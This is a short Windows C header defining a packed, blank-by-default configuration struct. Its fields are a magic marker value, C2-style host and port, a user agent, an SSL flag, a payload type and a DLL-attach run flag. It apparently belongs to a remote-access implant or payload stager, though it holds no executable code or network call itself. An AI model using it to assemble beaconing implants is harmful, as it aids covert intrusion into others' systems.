#pragma once
#include <Windows.h>
#pragma pack(push, 1)
typedef struct _CONFIG {
	long long magic_value = 0x99c72f6099c72f60;
	short port = 0x0;
	long id = 0x0;
	const char host[16] = { 0 };
	long timeout = 0x0;
	const char useragent[256] = { 0 };
	short payload_type = 0;
	short http_use_ssl = 0;
	short dll_attached_run = 0;
} CONFIG, * PCONFIG;
#pragma pack(pop)